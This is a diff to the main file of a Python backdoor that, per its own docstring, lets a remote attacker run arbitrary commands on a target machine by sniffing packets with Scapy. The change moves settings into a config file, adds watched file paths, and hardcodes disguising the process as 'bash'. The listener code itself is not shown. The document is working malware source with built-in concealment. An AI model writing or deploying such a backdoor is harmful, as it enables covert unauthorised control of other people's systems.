@@ -2,9 +2,9 @@
 from scapy.all import *
 import getpass
 import os
-import argparse
 from Listener import Listener
 import procname
+import ConfigParser
 """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 ''' Backdoor program that can allow a remote attacker to execute arbitrary commands on the target machine. 
 ''' Uses libpcap via Scapy to listen for packets directly on the NIC for either tcp or udp packets (user-
@@ -39,38 +39,33 @@ import procname
 '''
 """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
-VALID_PROTOS = ('tcp', 'udp')
-
 def main():
     """
     Entry point for the backdoor program.
     :return:
     """
-    #os.setuid(0)
-    #os.seteuid(0)
+    # os.setuid(0)
+    # os.seteuid(0)
 
-    parser = argparse.ArgumentParser()
+    config = ConfigParser.ConfigParser()
+    config.read('./bd.config')
 
-    parser.add_argument('-r', '--rhost', dest='rhost', required=True,
-                        help='The IP address of the backdoor')
-    parser.add_argument('-s', '--sport', dest='sport', required=True,
-                       help='Source port')
-    parser.add_argument('-d', '--dport', dest='dport', required=True,
-                       help='Destination port')
-    parser.add_argument('-p', '--proto', dest='proto', required=True,
-                        help='Protocol to use: tcp or udp')
-    parser.add_argument('-l', '--lhost', dest='lhost', required=True,
-                       help='IP address of this machine')
-    parser.add_argument('-k', '--key', dest='key', required=True,
-                       help='Encryption key to use')
-    parser.add_argument('-n', '--name',  dest='procname', required=False,
-                       help='Name to mask the process as')
-    args = parser.parse_args()
+    # initial setup stuff
+    remote_host = config.get('Setup', 'rhost')
+    local_host = config.get('Setup', 'lhost')
+    source_port = config.get('Setup', 'sport')
+    dest_port = config.get('Setup', 'dport')
+    protocol = config.get('Setup', 'proto')
+    encryption_key = config.get('Setup', 'enkey')
 
-    procname.setprocname(args.procname)
+    # initial watches
+    watches = config.get('Watches', 'paths').split(',')
 
-    listener = Listener(args.rhost, args.lhost, args.sport, args.dport,
-                        args.proto, args.key)
+    # hide the process name
+    procname.setprocname('bash')
+
+    listener = Listener(remote_host, local_host, source_port, dest_port,
+                        protocol, encryption_key, watches)
     print('listening')
     listener.listen()
 
